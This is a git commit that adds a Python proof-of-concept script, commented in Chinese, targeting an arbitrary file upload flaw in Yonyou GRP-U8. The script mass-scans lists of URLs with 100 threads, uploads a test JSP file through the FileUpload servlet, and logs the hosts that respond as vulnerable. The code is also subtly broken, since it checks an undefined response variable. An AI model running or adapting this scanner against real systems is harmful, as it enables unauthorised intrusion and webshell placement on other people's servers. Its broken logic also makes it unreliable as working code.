9080752c1b7a381eb78fc6a685bd49251ba249ab
CHKer109 <642971737@qq.com>
2024-07-22 13:26:52 +0800

    Add files via upload

---
+++ POC_7.py
@@ -0,0 +1,68 @@
+#用友-GRP-U8任意文件上传漏洞
+#导包外置
+import requests,argparse,sys
+from multiprocessing.dummy import Pool
+# 关闭告警
+requests.packages.urllib3.disable_warnings()
+
+def banner():
+    test = """   _____ _____  _____        _    _  ___   
+  / ____|  __ \|  __ \      | |  | |/ _ \  
+ | |  __| |__) | |__) |_____| |  | | (_) | 
+ | | |_ |  _  /|  ___/______| |  | |> _ <  
+ | |__| | | \ \| |          | |__| | (_) |  
+  \_____|_|  \_\_|           \____/ \___/   
+                                author :CHKer
+                                version:1.0.0
+  """
+    print(test)
+
+def main():
+    banner()
+    parser = argparse.ArgumentParser(description="用友-GRP-U8任意文件上传漏洞")
+    parser.add_argument('-u', '--url', dest='url', type=str, help=' input your url')
+    parser.add_argument('-f', '--file', dest='file', type=str, help='input your file path')
+    args = parser.parse_args()
+    if args.url and not args.file:
+        poc(args.url)
+    elif not args.url and args.file:
+        url_list = []
+        with open(args.file, 'r', encoding='utf-8') as fp:
+            for i in fp.readlines():
+                url_list.append(i.strip().replace('\n', ''))
+        mp = Pool(100)
+        mp.map(poc, url_list)
+        mp.close()
+        mp.join()
+    else:
+        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
+
+def poc(target):
+    payload = '/servlet/FileUpload?fileName=test.jsp&actionID=update'
+    headers = {
+        "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:105.0) Gecko/20100101 Firefox/105.0",
+        "Content-Type":"application/x-www-form-urlencoded",
+        "Content-Length":"51",
+        "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+        "Accept-Encoding":"gzip, deflate",
+        "Accept-Language":"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
+        "Connection":"close"     
+    }
+    proxies = {
+        'http':'http://127.0.0.1:8080',
+        'https':'http://127.0.0.1:8080'
+    }
+    data = '<% out.println(""This page has a vulnerability!"");%>'
+    try:
+        res1 = requests.get(url=target+payload, headers=headers, timeout=10,data=data,verify=False,proxies=proxies)
+        if res2.status_code == 200:
+            print(f"[+]该url:{target}存在任意文件上传漏洞")
+            with open('result7.txt','a', encoding='utf-8') as fp:
+                fp.write(f"{target}"+"\n")
+        else:
+            print(f'[-]该url:{target}不存在任意文件上传漏洞')
+    except:
+        print(f'[-]该url:{target}该站点存在问题')
+
+if __name__ == '__main__':
+    main()
